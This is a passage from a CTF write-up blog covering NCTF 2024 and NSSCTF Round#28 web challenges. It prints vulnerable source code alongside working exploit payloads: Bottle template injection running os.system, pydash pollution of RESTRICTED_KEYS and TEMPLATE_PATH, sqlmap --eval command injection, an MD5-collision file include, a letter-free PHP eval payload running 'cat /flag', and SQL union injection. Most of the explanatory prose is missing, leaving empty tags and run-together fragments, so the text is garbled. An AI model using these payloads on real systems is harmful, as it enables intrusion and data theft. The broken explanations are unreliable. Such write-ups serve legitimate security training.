]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">pydash</a></p><p><code>Bottle</code><code>GHCTF2025</code><code>&#123;&#125;.</code><code>os.system()</code><br /><code>%</code><strong>python</strong><code>&lt;%xxx%&gt;</code>(<code>/render/1</code><code>include</code>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/render?path=%getattr(__import__(<span class="string">&#x27;os&#x27;</span>), <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;env &gt; 1&#x27;</span>)</span><br><span class="line">/render?path=%include(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/render</code><strong></strong><code>?path=1</code></p><p><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://err0r233.github.io/posts/32411.html">Err0r233</a><br /><code>bottle</code><code>vscode</code><code>bottle</code></p><p></p><p><code>bottle.template</code><code>template</code><code>tpl</code><code>\n&#123;%$</code><code>TEMPLATES[tplid]</code><code>TEMPLATE_PATH</code><br /><code>lookup = kwargs.pop('template_lookup', TEMPLATE_PATH</code></p><p><code>&#123;&#125;</code><code>TEMPLATE_PATH</code></p><p><code>pydash.set_(obj,path,value)</code><strong></strong></p><p><code>setval.__globals__.bottle.TEMPLATE=['/proc/self']</code></p><p><code>pydash__globals__</code></p><p><code>pydash</code><code>8.0.5</code>()<code>__globals__</code><code>bottle</code><code>pydash 5.1.2</code><code>__globals__</code><code>access to restricted key __globals__</code><code>restricted key</code></p><p><code>RESTRICTED_KEYS</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pydash.helpper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</code></p><p><code>pydash</code><code>RESTRICTED_KEYS</code><code>globals</code>(<code>__globals__</code><strong></strong><code>__globals__</code>)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>TEMPLATE_PATH</code><code>/proc/self</code><code>/render?path=environ</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=setval</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/proc/self&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.16.204:20055/&quot;</span></span><br><span class="line">a1 = requests.post(url+<span class="string">&quot;setValue?name=pydash&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span>, <span class="string">&quot;value&quot;</span>: []&#125;)</span><br><span class="line"></span><br><span class="line">a2 = requests.post(url+<span class="string">&quot;setValue?name=setval&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span>, <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/proc/self&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">a3 = requests.get(url+<span class="string">&quot;render?path=environ&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a3.text)</span><br></pre></td></tr></table></figure><h2 id="sqlmap-master"><a class="markdownIt-Anchor" href="#sqlmap-master"></a> sqlmap-master</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><strong>shell=Truesubprocess.callshellshell=Falsesubprocess.call</strong></p><p><code>command.split()</code><code>sqlmap</code><br /><code>compose.yml</code><code>flag</code><strong></strong><code>FLAG</code></p><p>emmmm<code>sqlmap</code><code>--file-read</code><br /><code>--eval</code></p><p><a href="https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/#sqlmap-master">wp</a><br />()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">eval</span> Python </span><br><span class="line">-c CONFIGFILEini</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">--eval eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;echo$IFS$FLAG&gt;&gt;114514&#x27;)&quot;)</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>c <span class="number">114514</span></span><br></pre></td></tr></table></figure><p><strong>sqlmap-master</strong></p><p><code>-c</code><br /><code>127.0.0.1 -c /proc/self/environ</code></p><p><a href="https://exp10it.io/2025/03/nctf-2024-web-writeup/">wp</a><code>env</code><br /><code>127.0.0.1 --eval __import__('os').system('env')</code></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="qrcode-reconstruction"><a class="markdownIt-Anchor" href="#qrcode-reconstruction"></a> QRcode Reconstruction</h2><p><br /><img src="https://pic1.zhimg.com/80/v2-e3dce2dc4b1481a7641ed85532c6c157_1440w.png" alt="" /><br /><br /><img src="https://pica.zhimg.com/80/v2-04ba7358595be0e373b888bf579b4a6a_1440w.png" alt="" /><br /><br /><img src="https://pica.zhimg.com/80/v2-d50339b7af09d24516fb9fb6847b5afc_1440w.png" alt="" /><br /><strong>flag</strong><br /><img src="https://pica.zhimg.com/80/v2-7067f81c3451be3b59ff1c4c518d640a_1440w.png" alt="" /><br /><strong>NCTF{WeLc0mE_t0_Nctf_2024!!!}</strong><br /></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="sign"><a class="markdownIt-Anchor" href="#sign"></a> Sign()</h2><blockquote><p></p></blockquote><p>emmmmm</p><p><a href="https://crystaljiang232.github.io/nctf2024/">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh&quot;&gt;laogongwp&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Ancho</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF Round#28 &amp;&amp; 2025 WriteUps</title>
    <link href="https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2025-03-22T08:57:18.000Z</published>
    <updated>2025-03-24T10:02:56.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nssctf-round28"><a class="markdownIt-Anchor" href="#nssctf-round28"></a> NSSCTF Round#28</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="ez_ssrf"><a class="markdownIt-Anchor" href="#ez_ssrf"></a> ez_ssrf</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>127.0.0.1</strong><code>?url=http://0.0.0.0/flag</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0(0.0.0.0) 0.0.0.0 </span><br><span class="line">127.x.x.x .1</span><br></pre></td></tr></table></figure><h3 id="ez_php"><a class="markdownIt-Anchor" href="#ez_php"></a> ez_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>%00</code><code>fastcoll</code><code>level2.php</code><strong></strong>(<code>flag</code>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/level2.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/?password=123456%00&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># level2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://exp10it.io/2022/10/2022-hnctf-web-writeup/#challenge__rce"></a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;<span class="string">&#x27;rce&#x27;</span>: <span class="string">&#x27;$_=([].)&#123;3&#125;;$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].)&#123;2&#125;;$_=_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/level2.php?0=system&amp;1=cat /flag&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="light_pink"><a class="markdownIt-Anchor" href="#light_pink"></a> light_pink</h3><p>()<code>order by</code>()<code>-</code><code>#</code><code>%23</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5%23 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span><span class="operator">%</span><span class="number">23</span>    id<span class="keyword">union</span>nss_board</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like &#x27;</span>nss_board<span class="string">&#x27;%23   likeCute,messages</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(column_name),<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="keyword">like</span> <span class="string">&#x27;Cute&#x27;</span><span class="operator">%</span><span class="number">23</span>    id,Happyid,username,title,content,created_at</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(Happy),5 from Cute%23</span></span><br></pre></td></tr></table></figure><p><code>sqlmap</code>()</p><h3 id="coding-loving"><a class="markdownIt-Anchor" href="#coding-loving"></a> Coding Loving</h3><p><strong>Code Audit</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Ciallo( &#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo( &#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span 